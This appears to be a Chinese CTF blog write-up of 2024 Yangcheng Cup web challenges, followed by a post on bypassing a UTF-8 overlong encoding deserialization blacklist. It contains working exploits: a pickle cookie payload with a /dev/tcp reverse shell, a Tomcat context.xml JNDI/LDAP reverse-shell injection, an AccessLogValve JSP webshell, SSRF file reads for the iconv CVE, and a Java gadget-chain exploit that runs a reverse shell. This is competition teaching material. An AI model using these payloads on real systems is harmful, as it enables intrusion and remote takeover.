python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie,cookie_encode,cookie_encode_raw<br><br>url = <span class="hljs-string">&quot;http://139.155.126.78:32301/&quot;</span> <span class="hljs-comment">#lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:5000/&quot; #lyrics?lyrics=/usr/etc/app/app.py&quot;</span><br><br><br>res = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;testtest&quot;</span>&#125;<br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">S&#x27;admin&#x27;</span><br><span class="hljs-string">dt.&#x27;&#x27;&#x27;</span><br><br>data = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;user&#x27;</span><br><span class="hljs-string">(S&#x27;username&#x27;</span><br><span class="hljs-string">(S&#x27;os&#x27;</span><br><span class="hljs-string">S&#x27;system&#x27;</span><br><span class="hljs-string">\x93S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span><br><span class="hljs-string">odt.&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># a = set_cookie(, res, secret=secret_code)</span><br><span class="hljs-comment"># a= cookie_encode((&quot;user&quot;, res), secret_code)</span><br>a= cookie_encode_raw(data, secret_code)<br><span class="hljs-built_in">print</span>(a)<br><br>re = requests.get(url+<span class="hljs-string">&quot;/board&quot;</span>,cookies=&#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:a.decode()<br>&#125;)<br><span class="hljs-built_in">print</span>(re.text)<br></code></pre></td></tr></table></figure><h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>有点好玩的题，但是非预期也蛮多……</p><p>给了一个登录路由，读xml的路径，web.xml给ban了。首先读到账密登录，里面又是文件上传，只能传xml。</p><p>这道可以覆盖<code>/opt/tomcat/myapp/WEB-INF/web.xml</code>，但覆盖不了conf目录下的web.xml。</p><p>所以第一题我们直接覆盖tomcat-web.xml，让xml解析成jsp。</p><p>上传jsp木马就完事了。过程就偷懒不写了。</p><h2 id="tomtom2-revenge"><a href="#tomtom2-revenge" class="headerlink" title="tomtom2_revenge"></a>tomtom2_revenge</h2><p>web.xml彻底ban了，不能套用方法让xml解析成jsp了。通过tomtom2读源码，分析发现tomcat有h2的lib。</p><p>所以我们考虑打jndi到h2的getter。</p><p>上传路径为<code>/opt/tomcat/conf/</code>，直接覆盖该目录下的<code>context.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="hljs-comment">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="hljs-comment">  this work for additional information regarding copyright ownership.</span><br><span class="hljs-comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="hljs-comment">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="hljs-comment">  the License.  You may obtain a copy of the License at</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment">  See the License for the specific language governing permissions and</span><br><span class="hljs-comment">  limitations under the License.</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-comment">&lt;!-- The contents of this file will be loaded for each web application --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span><br>    <span class="hljs-comment">&lt;!-- web application will be reloaded.                                   --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>WEB-INF/tomcat-web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">WatchedResource</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    &lt;Manager pathname=&quot;&quot; /&gt;</span><br><span class="hljs-comment">    --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">dataSourceName</span>=<span class="hljs-string">&quot;ldap://vps:1389/TomcatJDBC/H2/Java/ReverseShell/vps/port&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">autoCommit</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但问了其他队交流了下，这道题还有个非预期是覆盖<code>META-INF/context.xml</code>，利用<code>org.apache.catalina.valves.AccessLogValve</code></p><p>上传路径为<code>./META-INF</code>，传入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Value</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">directory</span>=<span class="hljs-string">&quot;/opt/tomcat/webapps/myapp/&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">prefix</span>=<span class="hljs-string">&quot;shell&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">suffix</span>=<span class="hljs-string">&quot;.jsp&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;%&#123;Cookie&#125;i&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">resolveHosts</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后带一个恶意cookie访问&#x2F;myapp：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>然后就可以访问<code>shell.2024-08-27.jsp</code>，（后缀生成时间即当天）内存马就注入了，参数为cmd，确实高手。</p><h2 id="网络照相馆"><a href="#网络照相馆" class="headerlink" title="网络照相馆"></a>网络照相馆</h2><p>打SSRF的东西，file:&#x2F;&#x2F;伪协议可读文件：</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224400557.png" alt="image-20240827224400557"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224416038.png" alt="image-20240827224416038"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224431698.png" alt="image-20240827224431698"></p><p>hash_file处存在sql注入，而且因为这是php8打不了phar，很自然想到CVE-2024-2961那个iconv的洞。</p><p>先使用file伪协议读取maps和libc：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/proc/self/maps&quot;</span> -o maps<br>curl <span class="hljs-string">&quot;http://139.155.126.78:32411/url.php&quot;</span> -d <span class="hljs-string">&quot;url=file://127.0.0.1/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span> -o lic.so<br></code></pre></td></tr></table></figure><p>然后从sql注入处打改良的iconv-payload:</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224653523.png" alt="image-20240827224653523"></p><p>反弹不了shell，可能是命令问题，所以直接写入一句话木马，直接交了：</p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224724342.png" alt="image-20240827224724342"></p><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/image-20240827224731151.png" alt="image-20240827224731151"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>比赛当天真的累得跟个狗似的，从早上9点一直打到凌晨2点，还不敢睡觉，三点就被偷家了。</p><p>我的评价是不会办比赛就不要办。喜欢搞24小时赛制，还没有py检测机制，flag都是静态flag，完全成py大赛了，这就是ycb。</p><p>既来之则安之，我倒要看看9月11号线下都是些啥妖魔鬼怪。</p><p>以上。</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UTF-8 Overlong Encoding Bypass</title>
    <link href="/2024/08/22/Overlong-Encoding-utf-8-Bypass/"/>
    <url>/2024/08/22/Overlong-Encoding-utf-8-Bypass/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>UTF-8 Overlong Encoding</code>一种绕过黑名单的手段，之前打题遇到过两次，这次小小总结一下。</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master · qi4L&#x2F;JYso (github.com)</a></p><p>一次是在京麒CTF里用这个方法打出过一道，还有一道是最近的巅峰极客JDK17+CC链的绕过。</p><p>P牛介绍了UTF-8编码方式以及Overlong Encoding的攻击：<a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html#0x04-overlong-encodingwaf">UTF-8 Overlong Encoding导致的安全问题 | 离别歌 (leavesongs.com)</a>，在此我不再多说。</p><p>可以通过javassist来对writeUTF函数进行修改，插桩在agent处：<a href="https://xz.aliyun.com/t/14300?time__1311=GqAxuD9QiQDQ0=D/82cqYuOrzG881HDgWoD">java反序列化通过java agent实现utf-8 Overlong Encoding - 先知社区 (aliyun.com)</a></p><p>这里还是结合题目来讲，因为这算一个Bypass的技巧，光讲理论肯定不够。</p><h2 id="京麒CTF2024-Ezjvav"><a href="#京麒CTF2024-Ezjvav" class="headerlink" title="京麒CTF2024-Ezjvav"></a>京麒CTF2024-Ezjvav</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>admin&#x2F;admin弱密码登录，</p><p>扫网页发现&#x2F;js&#x2F;manage.js，访问得到js混淆代码，直接gpt梭：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error));<br>&#125;;<br></code></pre></td></tr></table></figure><p>意思就是跳转&#x2F;source读源码出来。</p><p>但是有个jwt验证，其实密钥就是jsrc，然后带cookie访问&#x2F;source得到附件，直接down下来分析。</p><p>blacklist：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.util.HashMap&quot;</span>,<br> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <br> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONArrayLlist&quot;</span>&#125;;<br> <br> ----------------------------------------------------------------------------------------------------<br> <br>        blackList.add(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.syndication.feed.impl.ToStringBean&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>        blackList.add(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br></code></pre></td></tr></table></figure><p>rome链子的一些被ban了，可以看到二次反序列化用的SignedObject也被ban了。</p><p>依赖如下，有fj，rome，spring：</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822162719499.png" alt="image-20240822162719499"></p><p>但这道题只要使用<code>UTF-8 Overlong Encoding</code>就可以绕过这个blacklist。</p><p>sink点很好找：</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163252420.png" alt="image-20240822163252420"></p><p>代码逻辑可见两层waf，第一个是他自定义的MyObjectInputStream，还有一个Compared()函数的检测。</p><p>MyObjectInputStream的blacklist上面就讲了。</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163401930.png" alt="image-20240822163401930"></p><p>Compared()函数的blacklist：</p><p><img src="/2024/08/22/Overlong-Encoding-utf-8-Bypass/image-20240822163418863.png" alt="image-20240822163418863"></p><p>也就是说一个是明文流量层面的检测，一个是反序列化过程的检测，前者可以自定义输出流改写序列化数据绕过，也就是UTF8那玩意。<a href="https://vidar-team.feishu.cn/docx/LJN4dzu1QoEHt4x3SQncYagpnGd">Docs (feishu.cn)</a></p><p>因为依赖有spring的缘故，我们还可以想到Jackson的一个原生反序列化链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">EventListenerList.readObject -&gt; <br>POJONode.toString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/14190?time__1311=mqmx9QDQdCqqlpzG77Twk4frxA2DGwD&alichlgref=https://www.google.com/">Jackson原生反序列化</a></p><p><a href="https://xz.aliyun.com/t/12846?time__1311=mqmhq+xfrxCWDsD7GY0=YG=FdrIxAx7IIQx&alichlgref=https://www.google.com/#toc-2">处理Jackson链子不稳定性</a></p><p>又因为有fj依赖，所以还能打fastjson的原生反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject -&gt;<br>HashMap.putVal -&gt;<br>HotSwappableTargetSource.equals -&gt;<br>XString.equals -&gt;<br>JSONArray.toString -&gt; <br>JSONArray#toJSONString -&gt; <br>TemplatesImpl.getOutputProperties<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>Bypass的方法就是直接用<code>UTF8 Overlong Encoding</code>重写一个<code>ObjectOutputStream</code>，用Jackson链稍微改改就有了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.example.jsrc.func.ByteCompare;<br><span class="hljs-keyword">import</span> com.example.jsrc.func.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//最通用的办法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        ctClass.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, ctClass);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        ctClass.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> getProxy(templatesImpl, Templates.class);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> getXstringMap(proxy);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">UTF8OverlongObjectOutputStream</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OverlongObjectOutputStream</span>(byteArrayOutputStream);<br>        o.writeObject(exp);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(payload);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">(Object obj,Class&lt;?&gt; clazz)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(obj);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;clazz&#125;, handler);<br>        